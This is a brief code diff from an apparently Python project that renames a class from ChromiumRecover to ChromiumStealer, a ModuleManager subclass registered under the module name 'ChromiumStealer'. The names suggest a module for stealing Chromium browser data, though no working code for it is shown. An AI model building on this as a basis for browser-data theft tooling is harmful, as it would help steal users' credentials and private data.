@@ -42,7 +42,7 @@ from config import Constant
 from config import ModuleManager
 
 
-class ChromiumRecover(ModuleManager):
+class ChromiumStealer(ModuleManager):
     
     def __init__(self) -> None:
         super().__init__(module_name="ChromiumStealer")
